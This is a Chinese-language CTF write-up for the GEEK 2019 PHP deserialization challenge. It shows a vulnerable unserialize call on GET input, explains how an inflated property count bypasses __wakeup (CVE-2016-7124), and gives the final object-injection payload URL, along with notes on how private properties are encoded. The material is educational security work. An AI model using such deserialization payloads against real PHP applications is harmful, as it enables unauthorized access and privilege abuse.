-<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">include 'class.php';</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">$select = $_GET['select'];</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">$res = unserialize(@$select);</span>
-</span></code></pre></div>
-<h3 id="classphp"><a class="toclink" href="../../geek2019-php/#classphp">最后看 class.php</a></h3>
-<p><img alt="class.php" src="../../../assets/images/geek2019-php/03-class.png" /></p>
-<p>得知需要让 <code>username = admin</code>，<code>password = 100</code>；再反序列化。</p>
-<p><img alt="__destruct 逻辑" src="../../../assets/images/geek2019-php/04-destruct.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">function __destruct() {</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="x">    if ($this-&gt;password != 100) {</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="x">        echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";</span>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="x">        echo "You name is: ";</span>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="x">        echo $this-&gt;username; echo "&lt;/br&gt;";</span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="x">        echo "You password is: ";</span>
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="x">        echo $this-&gt;password; echo "&lt;/br&gt;";</span>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="x">        die();</span>
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="x">    }</span>
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="x">    if ($this-&gt;username === 'admin') {</span>
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="x">        global $flag;</span>
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="x">        echo $flag;</span>
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="x">    } else {</span>
-</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="x">        echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!";</span>
-</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="x">        die();</span>
-</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="x">    }</span>
-</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="x">}</span>
-</span></code></pre></div>
-<h3 id="__wakeup"><a class="toclink" href="../../geek2019-php/#__wakeup">绕过 <code>__wakeup</code></a></h3>
-<p>先进行序列化：</p>
-<p><img alt="本地生成序列化" src="../../../assets/images/geek2019-php/05-serialize.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">$a = new Name('admin', 100);</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="x">echo serialize($a);</span>
-</span></code></pre></div>
-<p>但是要注意这里的 <code>__wakeup()</code>，它会直接将 <code>username</code> 修改为 <code>guest</code>：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="x">function __wakeup() {</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="x">    $this-&gt;username = 'guest';</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="x">}</span>
-</span></code></pre></div>
-<p>所以这里必须绕过。利用的办法是：<strong>当序列化串声明的属性个数大于实际属性个数时，会直接跳过 <code>__wakeup()</code></strong>。</p>
-<p>所以这里把属性数由 <code>2</code> 改为 <code>3</code>。</p>
-<div class="admonition note">
-<p class="admonition-title">这个技巧有版本限制</p>
-<p>这是 <strong>CVE-2016-7124</strong>，影响 PHP &lt; 5.6.25 / 7.0.10。</p>
-<p>在 PHP 7.4 上实测：<code>O:4:"Name":3:{...}</code> 会<strong>直接解析失败</strong>（不是跳过 <code>__wakeup</code>，是整个包解析不了）。</p>
-</div>
-<h3 id="00"><a class="toclink" href="../../geek2019-php/#00">关于 <code>%00</code></a></h3>
-<p>另外，直接将这个复制到 URL 上时，<code>private</code> 属性名两侧的 <code>%00</code> 会被吞掉，所以先进行 URL 编码再放上去，或者放上去之后再自己手补 <code>%00</code>。</p>
-<h3 id="payload"><a class="toclink" href="../../geek2019-php/#payload">最终 payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>/?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
-</span></code></pre></div>
-<div class="admonition warning">
-<p class="admonition-title"><code>O:4:"Name":3:</code> 后面那个冒号不能丢</p>
-<p>✅ <code>O:4:"Name":3:{...}</code></p>
-<p>❌ <code>O:4:"Name":3{...}</code> ← 少一个冒号，<code>unserialize</code> 直接返回 false</p>
-</div>
-<p>成功得到 flag：</p>
-<p><img alt="拿到 flag" src="../../../assets/images/geek2019-php/06-flag.png" /></p>
-<h3 id="private-public"><a class="toclink" href="../../geek2019-php/#private-public">补充：private 和 public 的序列化区别</a></h3>
-<p><strong><code>private</code> 属性下，构造的序列化串是「类名 + 属性名」的形式（别忘了 <code>%00</code>）：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>s:14:"\0Name\0username"      ← \0 + Name + \0 + username = 1+4+1+8 = 14
-</span></code></pre></div>
-<p><strong>而 <code>public</code> 方式只是属性名的形式：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>s:8:"username"
-</span></code></pre></div>
-<p><strong><code>protected</code> 则是 <code>\0*\0属性名</code>。</strong></p>
-<p><strong>长度一律按真实字节数算，<code>\0</code> 算 1 个字节 —— 这也是手写 payload 最容易错的地方。</strong></p>
     
     
   </div>
